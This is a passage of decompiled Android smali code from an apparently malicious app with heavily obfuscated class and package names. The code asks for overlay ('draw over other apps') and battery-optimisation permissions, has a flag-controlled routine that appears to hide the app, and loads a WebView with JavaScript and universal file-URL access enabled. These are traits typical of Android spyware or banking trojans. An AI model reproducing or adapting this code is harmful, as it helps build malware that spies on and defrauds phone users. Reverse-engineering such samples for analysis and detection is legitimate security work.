    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v0, v6}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->Work(Landroid/content/Context;)V

    .line 788
    sget v6, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x17

    if-lt v6, v8, :cond_1c

    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->NeedSuper()Z

    move-result v6

    if-nez v6, :cond_1c

    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->ASKDRAW()Z

    move-result v6

    if-eqz v6, :cond_1c

    invoke-static/range {p0 .. p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v6

    if-nez v6, :cond_1c

    .line 790
    invoke-direct/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->AskDraw()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_a

    .line 797
    :catch_2
    sput-object v7, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    .line 798
    :goto_6
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    const-string v8, "ask_battary"

    if-eqz v6, :cond_16

    .line 800
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 801
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_15

    .line 803
    sput-object v8, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    const/4 v6, 0x0

    .line 804
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v8

    sput-object v8, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 810
    :cond_15
    sput-object v7, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_6

    .line 813
    :cond_16
    :goto_7
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    if-eqz v6, :cond_18

    .line 815
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 816
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_17

    .line 818
    sput-object v8, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    const/4 v6, 0x0

    .line 819
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_7

    .line 825
    :cond_17
    sput-object v7, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_7

    .line 828
    :cond_18
    :goto_8
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    if-eqz v6, :cond_1a

    .line 830
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 831
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_19

    .line 833
    sput-object v8, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    const/4 v6, 0x0

    .line 834
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_8

    .line 840
    :cond_19
    sput-object v7, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_8

    .line 843
    :cond_1a
    :goto_9
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    invoke-virtual {v6}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v6

    if-eqz v6, :cond_1c

    .line 845
    sput-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    .line 846
    sget-object v6, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1b

    .line 848
    sput-object v8, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/cuqzkbopfpglspmbsempbmkrkgdeesdubktfvkbihgdnouabcq14;->T2:Ljava/lang/String;

    const/4 v6, 0x0

    .line 849
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    sput-object v9, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_9

    .line 855
    :cond_1b
    sput-object v7, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/kyhkfgrpvquiywupkujryaurelarnumnjcrduqxlymgtsvfrlc11;->willbbjynyjdwbpnjltssapawokoijxynyzzyplujhsylldtskqfck212:Ljava/lang/Boolean;

    goto :goto_9

    .line 869
    :cond_1c
    :goto_a
    sget-object v5, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/ohjmalwekavrfvkufgkoddhvuhpndhvqlwjagcfwwcczgikueg3/cglmgaxoxvkhrislefpqbksqezjrqpfcsaxuwmgocuvxrpxsny71;->HideType:Ljava/lang/String;

    const-string v6, "K"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1d

    .line 871
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->Swapmgfygdjngvynnbwluynhxpwaysvprsspmrwqaasxcyscwranrq53Me(Landroid/content/Context;)V

    .line 872
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->finish()V

    return-void

    .line 877
    :cond_1d
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v0, v5}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->isinternetOK(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_27

    const v5, 0x7f070003

    .line 879
    invoke-virtual {v0, v5}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->setContentView(I)V

    const v5, 0x7f050025

    .line 880
    invoke-virtual {v0, v5}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    .line 881
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v6

    invoke-virtual {v6}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v6

    .line 882
    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v7

    if-eq v7, v13, :cond_21

    const/16 v8, 0xc6b

    if-eq v7, v8, :cond_20

    const/16 v4, 0xca9

    if-eq v7, v4, :cond_1f

    const/16 v3, 0xe7e

    if-eq v7, v3, :cond_1e

    goto :goto_b

    :cond_1e
    invoke-virtual {v6, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v14, 0x3

    goto :goto_c

    :cond_1f
    invoke-virtual {v6, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v14, 0x0

    goto :goto_c

    :cond_20
    invoke-virtual {v6, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v14, 0x2

    goto :goto_c

    :cond_21
    invoke-virtual {v6, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_22

    const/4 v14, 0x1

    goto :goto_c

    :cond_22
    :goto_b
    const/4 v14, -0x1

    :goto_c
    if-eqz v14, :cond_26

    const/4 v1, 0x1

    if-eq v14, v1, :cond_25

    const/4 v1, 0x2

    if-eq v14, v1, :cond_24

    const/4 v1, 0x3

    if-eq v14, v1, :cond_23

    const-string v1, "no internet connection detected.\n\n please connect to internet and try again"

    .line 900
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_23
    const-string v1, "internet ba\u011flant\u0131s\u0131 alg\u0131lanmad\u0131.\n\n l\u00fctfen internete ba\u011flan\u0131n ve tekrar deneyin"

    .line 896
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_24
    const-string v1, "\u672a\u68c0\u6d4b\u5230 Internet \u8fde\u63a5\u3002\n\n \u8bf7\u8fde\u63a5\u5230 Internet \u5e76\u91cd\u8bd5"

    .line 892
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_25
    const-string v1, "\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0643\u0634\u0641 \u0639\u0646 \u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a .\n\n \u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649"

    .line 888
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_d

    :cond_26
    const-string v1, "No internet connection detected.\n\n please connect to internet and try again"

    .line 884
    invoke-virtual {v5, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :goto_d
    const v1, 0x7f050027

    .line 906
    invoke-virtual {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/ImageView;

    .line 907
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->Oklistner:Landroid/view/View$OnClickListener;

    invoke-virtual {v1, v2}, Landroid/widget/ImageView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const v1, 0x7f05000f

    .line 909
    invoke-virtual {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    .line 910
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->out:Landroid/view/View$OnClickListener;

    invoke-virtual {v1, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_11

    .line 914
    :cond_27
    invoke-static {}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/otvarlznqtvjaceegiljocbnqbahomwtiwsbukewarlmancaub4/bghpkflbsrdsvseabfrvhaqeqknyboiznnnuhmgjgwuhcnhlux9;->AskDatausage()Z

    move-result v1

    if-eqz v1, :cond_28

    .line 915
    new-instance v1, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/_ask_network_;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    .line 916
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x800000

    .line 917
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    .line 915
    invoke-virtual {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->startActivity(Landroid/content/Intent;)V

    .line 923
    :cond_28
    :try_start_6
    invoke-virtual/range {p0 .. p0}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->getWindow()Landroid/view/Window;

    move-result-object v1

    const/high16 v2, 0x1000000

    invoke-virtual {v1, v2, v2}, Landroid/view/Window;->setFlags(II)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :catch_3
    const v1, 0x7f07000e

    .line 929
    invoke-virtual {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->setContentView(I)V

    const v1, 0x7f050043

    .line 930
    invoke-virtual {v0, v1}, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    iput-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    .line 931
    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 933
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    .line 934
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    .line 935
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 936
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    .line 937
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 938
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    .line 939
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    .line 940
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    .line 941
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    .line 942
    iget-object v1, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v1, 0x0

    .line 945
    :try_start_7
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    const/4 v3, 0x2

    invoke-virtual {v2, v3, v1}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    .line 946
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    sget-object v3, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    .line 947
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    sget-object v3, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    .line 948
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v2

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Landroid/webkit/WebSettings;->setEnableSmoothTransition(Z)V

    .line 949
    iget-object v2, v0, Lcleveland/considers/rblnyttyuslvorimqiywxgefcxxbsyhpqhhuinbdaqrqcubgpv2/bhuftjdmrnclghwxviksqzayazthmzytmqcpsjiscvbvjxlpuu31;->mWebView:Landroid/webkit/WebView;

